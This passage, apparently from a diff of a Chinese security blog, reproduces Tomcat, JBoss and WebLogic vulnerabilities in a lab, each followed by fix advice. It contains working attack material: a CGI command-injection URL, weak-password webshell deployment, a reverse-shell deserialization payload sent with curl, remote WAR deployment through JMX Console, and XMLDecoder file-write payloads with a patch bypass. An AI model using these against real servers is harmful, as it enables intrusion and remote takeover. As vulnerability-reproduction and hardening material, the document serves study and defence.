+<p>执行命令<code>http://127.0.0.1:8080/cgi-bin/lxhsec.bat?&amp;C:/WINDOWS/system32/net+user</code><br><img src="/2019/03/04/middleware/CVE-2019-0232-04.png" alt="CVE-2019-0232-04.png"></p>
+<p>Note:net命令的路径要写全，直接写net user，Tomcat控制台会提示<code>net</code>不是内部命令，也不是可运行的程序，另 必须使用+号连接，使用<code>空格</code>，<code>%2B</code>都会执行失败，控制台报错。</p>
+<h3 id="修复建议-14"><a href="#修复建议-14" class="headerlink" title="修复建议"></a>修复建议</h3><p>这个默认是关闭的，如果打开了请关闭，若需使用请升级版本。</p>
+<h2 id="Tomcat-弱口令-amp-amp-后台getshell漏洞"><a href="#Tomcat-弱口令-amp-amp-后台getshell漏洞" class="headerlink" title="Tomcat + 弱口令 &amp;&amp; 后台getshell漏洞"></a>Tomcat + 弱口令 &amp;&amp; 后台getshell漏洞</h2><p>环境：Apache Tomcat/7.0.94</p>
+<p>在conf/tomcat-users.xml文件中配置用户的权限：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;tomcat-users&gt;</div><div class="line">    &lt;role rolename=&quot;manager-gui&quot;/&gt;</div><div class="line">    &lt;role rolename=&quot;manager-script&quot;/&gt;</div><div class="line">    &lt;role rolename=&quot;manager-jmx&quot;/&gt;</div><div class="line">    &lt;role rolename=&quot;manager-status&quot;/&gt;</div><div class="line">    &lt;role rolename=&quot;admin-gui&quot;/&gt;</div><div class="line">    &lt;role rolename=&quot;admin-script&quot;/&gt;</div><div class="line">    &lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script&quot; /&gt;</div><div class="line">&lt;/tomcat-users&gt;</div></pre></td></tr></table></figure>
+<p>正常安装的情况下，tomcat7.0.94中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击。</p>
+<p>访问 <a href="http://127.0.0.1:8080/manager/html" target="_blank" rel="external">http://127.0.0.1:8080/manager/html</a> ,输入弱密码tomcat:tomcat，登陆后台。<br><img src="/2019/03/04/middleware/tomcatwar1.png" alt="tomcatwar1"></p>
+<p>生成war包：<br>jar -cvf lxhspy.war lxhspy.jsp</p>
+<p>部署后，访问 <a href="http://127.0.0.1:8080/war包名/包名内文件名" target="_blank" rel="external">http://127.0.0.1:8080/war包名/包名内文件名</a>, 如下。<br><img src="/2019/03/04/middleware/tomcatwar2.png" alt="tomcatwar2"></p>
+<h3 id="修复建议-15"><a href="#修复建议-15" class="headerlink" title="修复建议"></a>修复建议</h3><ol>
+<li>若无必要，取消manager/html功能。</li>
+<li>若要使用，manager页面应只允许本地IP访问</li>
+</ol>
+<h2 id="Tomcat-manager-App-暴力破解"><a href="#Tomcat-manager-App-暴力破解" class="headerlink" title="Tomcat manager App 暴力破解"></a>Tomcat manager App 暴力破解</h2><p>环境：Apache Tomcat/7.0.94</p>
+<p>访问：<a href="http://127.0.0.1:8080/manager/html" target="_blank" rel="external">http://127.0.0.1:8080/manager/html</a>, 输入密码，抓包，如下。</p>
+<p><img src="/2019/03/04/middleware/tomcatmanager1.png" alt="tomcatmanager1"></p>
+<p>刚才输入的账号密码在HTTP字段中的Authorization中，规则为Base64Encode(user:passwd)<br>Authorization: Basic dG9tY2F0OmFkbWlu<br>解码之后如下：</p>
+<p><img src="/2019/03/04/middleware/tomcatmanager2.png" alt="tomcatmanager2"></p>
+<p>将数据包发送到intruder模块，并标记dG9tY2F0OmFkbWlu。</p>
+<p>Payload type选择 Custom iterator，设置三个position，1为用户字典，2为<code>:</code>，3为密码字典，并增加Payload Processing 为Base64-encode如下：<br><img src="/2019/03/04/middleware/tomcatmanager3.png" alt="tomcatmanager3"></p>
+<p>最后取消Palyload Encoding编码。<br><img src="/2019/03/04/middleware/tomcatmanager4.png" alt="tomcatmanager4"></p>
+<p>结果：<br><img src="/2019/03/04/middleware/tomcatmanager5.png" alt="tomcatmanager5"></p>
+<h3 id="修复建议-16"><a href="#修复建议-16" class="headerlink" title="修复建议"></a>修复建议</h3><ol>
+<li>若无必要，取消manager/html功能。</li>
+<li>若要使用，manager页面应只允许本地IP访问</li>
+</ol>
+<h1 id="JBoss"><a href="#JBoss" class="headerlink" title="JBoss"></a>JBoss</h1><p>jBoss是一个基于J2EE的开发源代码的应用服务器。 JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
+<p>默认端口:8080,9990</p>
+<p>Windows下Jboss安装，</p>
+<ol>
+<li>下载<a href="http://jbossas.jboss.org/downloads/" target="_blank" rel="external">http://jbossas.jboss.org/downloads/</a></li>
+<li>解压，我这里解压后的目录为：C:\jboss-6.1.0.Final</li>
+<li>新建环境变量：JBOSS_HOME 值为： C:\jboss-6.1.0.Final<br>在path中加入：;%JBOSS_HOME%\bin; </li>
+<li>打开C:\jboss-6.1.0.Final\bin 双击run.bat。出现info消息，即配置成功。<br><img src="/2019/03/04/middleware/jboss1.png" alt="jboss1"></li>
+</ol>
+<p><strong>Note:注意JDK版本要在1.6~1.7之间，1.8版本 jBoss运行打开JMX Console会出现500错误。</strong><br><img src="/2019/03/04/middleware/jboss2.png" alt="jboss1"></p>
+<p>jboss默认部署路径：C:\jboss-6.1.0.Final\server\default\deploy\ROOT.war</p>
+<p>设置外网访问，<br>将C:\jboss-6.1.0.Final\server\default\deploy\jbossweb.sar\server.xml</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;!-- A HTTP/1.1 Connector on port 8080 --&gt;</div><div class="line">&lt;Connector protocol=&quot;HTTP/1.1&quot; port=&quot;$&#123;jboss.web.http.port&#125;&quot; address=&quot;$&#123;jboss.bind.address&#125;&quot; </div><div class="line">   redirectPort=&quot;$&#123;jboss.web.https.port&#125;&quot; /&gt;</div></pre></td></tr></table></figure>
+<p>将address=”${jboss.bind.address}” 设置为address=”0.0.0.0” ,并重启JBoss</p>
+<h2 id="JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）"><a href="#JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）" class="headerlink" title="JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）"></a>JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）</h2><p>访问 /invoker/readonly<br>返回500，说明页面存在，此页面存在反序列化漏洞。<br><img src="/2019/03/04/middleware/CVE-2017-121491.png" alt="CVE-2017-121491"></p>
+<p>利用工具:<a href="https://github.com/joaomatosf/JavaDeserH2HC" target="_blank" rel="external">JavaDeserH2HC</a>,我们选择一个Gadget：ReverseShellCommonsCollectionsHashMap，编译并生成序列化数据：</p>
+<p>生成ReverseShellCommonsCollectionsHashMap.class<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</div></pre></td></tr></table></figure></p>
+<p>生成ReverseShellCommonsCollectionsHashMap.ser<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.31.232:6666（ip是nc所在的ip）</div></pre></td></tr></table></figure></p>
+<p>利用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl http://192.168.31.205:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser</div></pre></td></tr></table></figure></p>
+<p><img src="/2019/03/04/middleware/CVE-2017-121492.png" alt="CVE-2017-121492"></p>
+<h2 id="JBoss-JMXInvokerServlet-反序列化漏洞"><a href="#JBoss-JMXInvokerServlet-反序列化漏洞" class="headerlink" title="JBoss JMXInvokerServlet 反序列化漏洞"></a>JBoss JMXInvokerServlet 反序列化漏洞</h2><p>访问 /invoker/JMXInvokerServlet<br>返回如下，说明接口开放，此接口存在反序列化漏洞。<br><img src="/2019/03/04/middleware/CVE-2015-7501-01.png" alt="CVE-2015-7501-01"></p>
+<p>这里直接利用CVE-2017-12149生成的ser，发送到/invoker/JMXInvokerServlet接口中。<br>如下：<br><img src="/2019/03/04/middleware/CVE-2015-7501-02.png" alt="CVE-2015-7501-02"></p>
+<h2 id="JBoss-EJBInvokerServlet-反序列化漏洞"><a href="#JBoss-EJBInvokerServlet-反序列化漏洞" class="headerlink" title="JBoss EJBInvokerServlet 反序列化漏洞"></a>JBoss EJBInvokerServlet 反序列化漏洞</h2><p>访问 /invoker/EJBInvokerServlet<br>返回如下，说明接口开放，此接口存在反序列化漏洞。<br><img src="/2019/03/04/middleware/CVE-2013-4810-01.png" alt="CVE-2013-4810-01"></p>
+<p>这里直接利用CVE-2017-12149生成的ser，发送到/invoker/EJBInvokerServlet接口中。<br>如下：<br><img src="/2019/03/04/middleware/CVE-2013-4810-02.png" alt="CVE-2013-4810-02"></p>
+<h2 id="修复建议-17"><a href="#修复建议-17" class="headerlink" title="修复建议"></a>修复建议</h2><ol>
+<li>不需要 http-invoker.sar 组件的用户可直接删除此组件。路径为：<code>C:\jboss-6.1.0.Final\server\default\deploy\http-invoker.sar</code>,删除后访问404.<br><img src="/2019/03/04/middleware/CVE-2017-121493.png" alt="CVE-2017-121493"></li>
+<li>或添加如下代码至 http-invoker.sar 下 web.xml 的 security-constraint 标签中，对 http invoker 组件进行访问控制：<br><code>&lt;url-pattern&gt;/*&lt;/url-pattern&gt;</code><br>路径为：<code>C:\jboss-6.1.0.Final\server\default\deploy\http-invoker.sar\invoker.war\WEB-INF\web.xml</code><br><img src="/2019/03/04/middleware/CVE-2017-121494.png" alt="CVE-2017-121494"></li>
+</ol>
+<h2 id="JBoss-lt-4-x-JBossMQ-JMS-反序列化漏洞（CVE-2017-7504）"><a href="#JBoss-lt-4-x-JBossMQ-JMS-反序列化漏洞（CVE-2017-7504）" class="headerlink" title="JBoss &lt;=4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）"></a>JBoss &lt;=4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）</h2><p>环境:jboss-4.2.3</p>
+<p>设置外网访问:<br>在<code>C:\jboss-4.2.3\server\default\deploy\jboss-web.deployer\server.xml</code><br>将address=”${jboss.bind.address} 改为：address=”0.0.0.0”, 重启Jboss<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;Connector port=&quot;8080&quot; address=&quot;$&#123;jboss.bind.address&#125;&quot;    </div><div class="line">     maxThreads=&quot;250&quot; maxHttpHeaderSize=&quot;8192&quot;</div><div class="line">     emptySessionPath=&quot;true&quot; protocol=&quot;HTTP/1.1&quot;</div><div class="line">     enableLookups=&quot;false&quot; redirectPort=&quot;8443&quot; acceptCount=&quot;100&quot;</div><div class="line">     connectionTimeout=&quot;20000&quot; disableUploadTimeout=&quot;true&quot; /&gt;</div></pre></td></tr></table></figure></p>
+<p>访问/jbossmq-httpil/HTTPServerILServlet，<br>返回<code>This is the JBossMQ HTTP-IL</code>，说明页面存在，此页面存在反序列化漏洞。<br><img src="/2019/03/04/middleware/CVE-2017-7504-01.png" alt="CVE-2017-7504-01"></p>
+<p>这里直接利用CVE-2017-12149生成的ser，发送到/jbossmq-httpil/HTTPServerILServlet接口中。<br>如下：<br><img src="/2019/03/04/middleware/CVE-2017-7504-02.png" alt="CVE-2017-7504-02"></p>
+<h3 id="修复建议-18"><a href="#修复建议-18" class="headerlink" title="修复建议"></a>修复建议</h3><p>升级至最新版。</p>
+<h2 id="Administration-Console-弱口令"><a href="#Administration-Console-弱口令" class="headerlink" title="Administration Console 弱口令"></a>Administration Console 弱口令</h2><p>Administration Console管理页面存在弱口令，<code>admin:admin</code>，登陆后台上传war包。</p>
+<ol>
+<li><p>点击Web Application (WAR)s<br><img src="/2019/03/04/middleware/JbossAdminconsole01.png" alt="JbossAdminconsole01"></p>
+</li>
+<li><p>Add a new resource，上传war包<br><img src="/2019/03/04/middleware/JbossAdminconsole02.png" alt="JbossAdminconsole02"></p>
+</li>
+<li>点击创建的war包进入下一层，若状态为stop，点击Start按钮（默认都是start状态，不需要点击Start按钮）<br><img src="/2019/03/04/middleware/JbossAdminconsole03.png" alt="JbossAdminconsole03"></li>
+<li>访问。<br><a href="http://xx.xx.xx.xx/[warname]/shellname.jsp" target="_blank" rel="external">http://xx.xx.xx.xx/[warname]/shellname.jsp</a><br><img src="/2019/03/04/middleware/JbossAdminconsole04.png" alt="JbossAdminconsole04"></li>
+</ol>
+<h3 id="修复建议-19"><a href="#修复建议-19" class="headerlink" title="修复建议"></a>修复建议</h3><ol>
+<li>修改密码<br><code>C:\jboss-6.1.0.Final\server\default\conf\props\jmx-console-users.properties</code><br><img src="/2019/03/04/middleware/JbossAdminconsole05.png" alt="JbossAdminconsole05"></li>
+<li>或删除Administration Console页面。<br>JBoss版本&gt;=6.0，admin-console页面路径为： <code>C:\jboss-6.1.0.Final\common\deploy\admin-console.war</code><br>6.0之前的版本，路径为<code>C:\jboss-4.2.3\server\default\deploy\management\console-mgr.sar\web-console.war</code></li>
+</ol>
+<h2 id="JMX-Console未授权访问"><a href="#JMX-Console未授权访问" class="headerlink" title="JMX Console未授权访问"></a>JMX Console未授权访问</h2><p>JMX Console默认存在未授权访问，直接点击JBoss主页中的JMX Console链接进入JMX Console页面。</p>
+<ol>
+<li><p>在JMX Console页面点击jboss.system链接，在Jboss.system页面中点击service=MainDeployer，如下<br><img src="/2019/03/04/middleware/Jbossjmxconsole01.png" alt="Jbossjmxconsole01"></p>
+</li>
+<li><p>进入service=MainDeployer页面之后，找到methodIndex为17 or 19的deploy 填写远程war包地址进行远程部署。<br><img src="/2019/03/04/middleware/Jbossjmxconsole02.png" alt="Jbossjmxconsole02"></p>
+</li>
+<li><p>这里我部署的war包为lxh.war，链接如下：<br><code>http://192.168.31.205:8080/jmx-console/HtmlAdaptor?action=invokeOp&amp;name=jboss.system:service=MainDeployer&amp;methodIndex=17&amp;arg0=http://192.168.31.205/lxh.war</code></p>
+</li>
+<li><p>访问<br><a href="http://xx.xx.xx.xx/[warname]/shellname.jsp" target="_blank" rel="external">http://xx.xx.xx.xx/[warname]/shellname.jsp</a><br><img src="/2019/03/04/middleware/Jbossjmxconsole03.png" alt="Jbossjmxconsole03"></p>
+</li>
+</ol>
+<h3 id="修复建议-20"><a href="#修复建议-20" class="headerlink" title="修复建议"></a>修复建议</h3><ol>
+<li>增加密码措施，防止未授权访问。<br>1）在<code>C:\jboss-6.1.0.Final\common\deploy\jmx-console.war\WEB-INF\jboss-web.xml</code>开启安全配置。<br><img src="/2019/03/04/middleware/Jbossjmxconsole05.png" alt="Jbossjmxconsole05"><br>2）在<code>C:\jboss-6.1.0.Final\common\deploy\jmx-console.war\WEB-INF\web.xml</code>开启安全认证。<br><img src="/2019/03/04/middleware/Jbossjmxconsole04.png" alt="Jbossjmxconsole04"><br>3）在<code>C:\jboss-6.1.0.Final\server\default\conf\login-config.xml</code>中可以看到JMX Console的用户密码配置位置。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;application-policy name=&quot;jmx-console&quot;&gt;</div><div class="line">  &lt;authentication&gt;</div><div class="line">    &lt;login-module code=&quot;org.jboss.security.auth.spi.UsersRolesLoginModule&quot;</div><div class="line">      flag=&quot;required&quot;&gt;</div><div class="line">      &lt;module-option name=&quot;usersProperties&quot;&gt;props/jmx-console-users.properties&lt;/module-option&gt;</div><div class="line">      &lt;module-option name=&quot;rolesProperties&quot;&gt;props/jmx-console-roles.properties&lt;/module-option&gt;</div><div class="line">    &lt;/login-module&gt;</div><div class="line">  &lt;/authentication&gt;</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>4）配置用户密码以及用户权限，这里新增lxhsec用户。<br><img src="/2019/03/04/middleware/Jbossjmxconsole06.png" alt="Jbossjmxconsole06"><br>5）重启JBoss，效果如下：<br><img src="/2019/03/04/middleware/Jbossjmxconsole07.png" alt="Jbossjmxconsole07"></p>
+<p>2.或删除JMX Console,后重启JBoss<br><code>C:\jboss-6.1.0.Final\common\deploy\jmx-console.war</code></p>
+<h1 id="WebLogic"><a href="#WebLogic" class="headerlink" title="WebLogic"></a>WebLogic</h1><p>WebLogic是美国Oracle公司出品的一个applicationserver，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
+<p>默认端口:7001</p>
+<p>测试环境版本：10.3.6<br>下载地址：<a href="https://download.oracle.com/otn/nt/middleware/11g/wls/1036/wls1036_win32.exe?AuthParam=1559386164_88cf328d83f60337f08c2c94ee292954" target="_blank" rel="external">https://download.oracle.com/otn/nt/middleware/11g/wls/1036/wls1036_win32.exe?AuthParam=1559386164_88cf328d83f60337f08c2c94ee292954</a></p>
+<p>下载完成后双击运行，一直点下一步就ok了。</p>
+<p>安装完成之后，在<code>C:\Oracle\Middleware\user_projects\domains\base_domain</code>这个目录双击<code>startWebLogic.cmd</code>启动Weblogic服务。</p>
+<p>浏览器访问：<a href="http://127.0.0.1:7001/" target="_blank" rel="external">http://127.0.0.1:7001/</a>, 界面上出现Error 404–Not Found，即启动成功。</p>
+<p>设置外网访问，在 域结构 -&gt; 环境 -&gt; 服务器<br>右边选择相应的Server（管理服务器），打开进行编辑，在监听地址:中填入0.0.0.0，保存后，重启Weblogic服务器即可。<br><img src="/2019/03/04/middleware/weblogic01.png" alt="weblogic01"></p>
+<p>以下复现若无特别说明均采用Weblogic 10.3.6</p>
+<h2 id="XMLDecoder-反序列化漏洞（CVE-2017-10271-amp-CVE-2017-3506）"><a href="#XMLDecoder-反序列化漏洞（CVE-2017-10271-amp-CVE-2017-3506）" class="headerlink" title="XMLDecoder 反序列化漏洞（CVE-2017-10271 &amp; CVE-2017-3506）"></a>XMLDecoder 反序列化漏洞（CVE-2017-10271 &amp; CVE-2017-3506）</h2><p>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p>
+<p>访问 /wls-wsat/CoordinatorPortType<br>返回如下页面，则可能存在此漏洞。<br><img src="/2019/03/04/middleware/cve-2017-10271-01.png" alt="cve-2017-10271-01"></p>
+<p>漏洞不仅存在于 /wls-wsat/CoordinatorPortType 。<br>只要是在wls-wsat包中的Uri皆受到影响，可以查看web.xml得知所有受到影响的Uri，路径为：<code>C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\wls-wsat\54p17w\war\WEB-INF\web.xml</code></p>
+<p>默认受到影响的Uri如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">/wls-wsat/CoordinatorPortType</div><div class="line">/wls-wsat/RegistrationPortTypeRPC</div><div class="line">/wls-wsat/ParticipantPortType</div><div class="line">/wls-wsat/RegistrationRequesterPortType</div><div class="line">/wls-wsat/CoordinatorPortType11</div><div class="line">/wls-wsat/RegistrationPortTypeRPC11</div><div class="line">/wls-wsat/ParticipantPortType11</div><div class="line">/wls-wsat/RegistrationRequesterPortType11</div></pre></td></tr></table></figure></p>
+<p>构造 写入文件 数据包发送，如下，其中<code>Content-Type需要等于text/xml,否则可能导致XMLDecoder不解析。</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">POST /wls-wsat/RegistrationPortTypeRPC HTTP/1.1</div><div class="line">Host: 127.0.0.1:7001</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:48.0) Gecko/20100101 Firefox/48.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Content-Type: text/xml</div><div class="line">Connection: close</div><div class="line">Content-Length: 629</div><div class="line"></div><div class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</div><div class="line">    &lt;soapenv:Header&gt;</div><div class="line">    &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</div><div class="line">    &lt;java&gt;</div><div class="line">    	&lt;object class=&quot;java.io.PrintWriter&quot;&gt;  </div><div class="line">        &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test33.jsp&lt;/string&gt;</div><div class="line">    	&lt;void method=&quot;println&quot;&gt;</div><div class="line">		&lt;string&gt;</div><div class="line">    			&lt;![CDATA[</div><div class="line">			&lt;% out.print(&quot;test777776666666&quot;); %&gt;</div><div class="line">    			]]&gt;</div><div class="line">    		&lt;/string&gt;</div><div class="line">    	&lt;/void&gt;</div><div class="line">    	&lt;void method=&quot;close&quot;/&gt;</div><div class="line">    	&lt;/object&gt;</div><div class="line">    &lt;/java&gt;</div><div class="line">    &lt;/work:WorkContext&gt;</div><div class="line">    &lt;/soapenv:Header&gt;</div><div class="line">    &lt;soapenv:Body/&gt;</div><div class="line">&lt;/soapenv:Envelope&gt;</div></pre></td></tr></table></figure></p>
+<p>访问 <code>/bea_wls_internal/test2.jsp</code>,如下：<br><img src="/2019/03/04/middleware/cve-2017-10271-02.png" alt="cve-2017-10271-02"></p>
+<p>不熟悉JAVA的小伙伴们可能会对这个构造的XML有所疑惑，可以参考下这篇<a href="https://docs.oracle.com/javase/tutorial/javabeans/advanced/longpersistence.html" target="_blank" rel="external">文章</a>。</p>
+<p>CVE-2017-3506的补丁加了验证函数，补丁在weblogic/wsee/workarea/WorkContextXmlInputAdapter.java中添加了validate方法, 验证Payload中的节点是否存在object Tag。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">private void validate(InputStream is)&#123;</div><div class="line">      WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();</div><div class="line">      try &#123;</div><div class="line">         SAXParser parser =factory.newSAXParser();</div><div class="line">         parser.parse(is, newDefaultHandler() &#123;</div><div class="line">            public void startElement(String uri, StringlocalName, String qName, Attributes attributes)throws SAXException &#123;</div><div class="line">               if(qName.equalsIgnoreCase(&quot;object&quot;)) &#123;</div><div class="line">                  throw new IllegalStateException(&quot;Invalid context type: object&quot;);</div><div class="line">               &#125;</div><div class="line">            &#125;</div><div class="line">         &#125;);</div><div class="line">      &#125; catch(ParserConfigurationException var5) &#123;</div><div class="line">         throw new IllegalStateException(&quot;Parser Exception&quot;, var5);</div><div class="line">      &#125; catch (SAXExceptionvar6) &#123;</div><div class="line">         throw new IllegalStateException(&quot;Parser Exception&quot;, var6);</div><div class="line">      &#125; catch (IOExceptionvar7) &#123;</div><div class="line">         throw new IllegalStateException(&quot;Parser Exception&quot;, var7);</div><div class="line">      &#125;</div><div class="line">   &#125;</div></pre></td></tr></table></figure></p>
+<p>我们将object换成void就可绕过此补丁，产生了CVE-2017-10271。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</div><div class="line">    &lt;soapenv:Header&gt;</div><div class="line">    &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</div><div class="line">    &lt;java&gt;</div><div class="line">    	&lt;void class=&quot;java.io.PrintWriter&quot;&gt;</div><div class="line">        &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test33.jsp&lt;/string&gt;</div><div class="line">    	&lt;void method=&quot;println&quot;&gt;</div><div class="line">		&lt;string&gt;</div><div class="line">    			&lt;![CDATA[</div><div class="line">			&lt;% out.print(&quot;test777776666666&quot;); %&gt;</div><div class="line">    			]]&gt;</div><div class="line">    		&lt;/string&gt;</div><div class="line">    	&lt;/void&gt;</div><div class="line">    	&lt;void method=&quot;close&quot;/&gt;</div><div class="line">    	&lt;/void&gt;</div><div class="line">    &lt;/java&gt;</div><div class="line">    &lt;/work:WorkContext&gt;</div><div class="line">    &lt;/soapenv:Header&gt;</div><div class="line">    &lt;soapenv:Body/&gt;</div><div class="line">&lt;/soapenv:Envelope&gt;</div></pre></td></tr></table></figure></p>
+<h3 id="修复建议-21"><a href="#修复建议-21" class="headerlink" title="修复建议"></a>修复建议</h3><p>1）安装补丁。<br>2）或删除wls-wsat组件，再次访问返回404.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">1.删除C:\Oracle\Middleware\wlserver_10.3\server\lib\wls-wsat.war</div><div class="line"></div><div class="line">2.删除C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\.internal\wls-wsat.war</div><div class="line"></div><div class="line">3.删除C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\wls-wsat</div><div class="line"></div><div class="line">4.重启Weblogic</div></pre></td></tr></table></figure></p>
+<p><img src="/2019/03/04/middleware/cve-2017-10271-03.png" alt="cve-2017-10271-03"><br>Note：wls-wsat.war属于一级应用包，对其进行移除或更名操作可能造成未知的后果，Oracle官方不建议对其进行此类操作。</p>
+<h2 id="Weblogic-wls9-async-response-wls-wsat-反序列化远程代码执行漏洞（CVE-2019-2725）"><a href="#Weblogic-wls9-async-response-wls-wsat-反序列化远程代码执行漏洞（CVE-2019-2725）" class="headerlink" title="Weblogic wls9_async_response,wls-wsat 反序列化远程代码执行漏洞（CVE-2019-2725）"></a>Weblogic wls9_async_response,wls-wsat 反序列化远程代码执行漏洞（CVE-2019-2725）</h2><p>影响组件：bea_wls9_async_response.war, wls-wsat.war<br>影响版本：10.3.6.0, 12.1.3.0</p>
+<h3 id="bea-wls9-async-response-war"><a href="#bea-wls9-async-response-war" class="headerlink" title="bea_wls9_async_response.war"></a>bea_wls9_async_response.war</h3><p>访问 /_async/AsyncResponseService<br>返回如下页面，则可能存在此漏洞。<br><img src="/2019/03/04/middleware/CVE-2019-2725-01.png" alt="CVE-2019-2725-01"></p>
+<p>漏洞不仅存在于 /_async/AsyncResponseService<br>只要是在bea_wls9_async_response包中的Uri皆受到影响，可以查看web.xml得知所有受到影响的Uri，路径为：<br><code>C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\bea_wls9_async_response\8tpkys\war\WEB-INF\web.xml</code></p>
+<p>默认受到影响的Uri如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">/_async/AsyncResponseService</div><div class="line">/_async/AsyncResponseServiceJms</div><div class="line">/_async/AsyncResponseServiceHttps</div></pre></td></tr></table></figure></p>
+<p>wls-wsat.war受影响的URI见XMLDecoder 反序列化漏洞（CVE-2017-10271 &amp; CVE-2017-3506）</p>
+<p>此漏洞实际上是CVE-2017-10271的又一入口，那么它是怎么绕过CVE-2017-10271的补丁，执行REC的呢。</p>
